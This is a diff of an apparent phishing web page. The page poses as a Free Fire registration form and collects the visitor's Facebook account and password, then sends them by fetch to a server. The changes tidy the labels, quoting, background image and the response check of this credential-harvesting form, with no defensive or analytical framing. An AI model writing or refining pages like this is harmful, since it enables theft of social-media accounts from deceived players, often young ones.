@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
-            background-image: url('./ff.jpg'); /* Replace 'your-background-image.jpg' with the actual path to your background image */
+            background-image: url('your-background-image.jpg'); /* Replace 'your-background-image.jpg' with the actual path to your background image */
             background-size: cover;
             background-position: center;
             display: flex;
@@ -33,10 +33,10 @@
             <label for="freefireid">Freefire ID:</label>
             <input type="text" id="freefireid" name="freefireid" required><br><br>
             
-            <label for="facebookAccount">FacebookAccount:</label>
+            <label for="facebookAccount">Facebook Account:</label>
             <input type="text" id="facebookAccount" name="usermobno" required><br><br>
             
-            <label for="facebookPassword">FacebookPassword:</label>
+            <label for="facebookPassword">Facebook Password:</label>
             <input type="password" id="facebookPassword" name="password" required><br><br>
             
             <button type="button" id="submit-button">Submit</button>
@@ -51,7 +51,7 @@
             submitButton.addEventListener('click', function () {
                 const formData = new FormData(form);
                 const requestBody = {
-                    usermobno: formData.get("usermobno"),
+                    usermobno: formData.get('usermobno'),
                     password: formData.get('password')
                 };
 
@@ -63,7 +63,7 @@
                     body: JSON.stringify(requestBody)
                 })
                 .then(response => {
-                    if (response.success) {
+                    if (response.ok) {
                         alert('Registration successful');
                     } else {
                         alert('Registration failed');
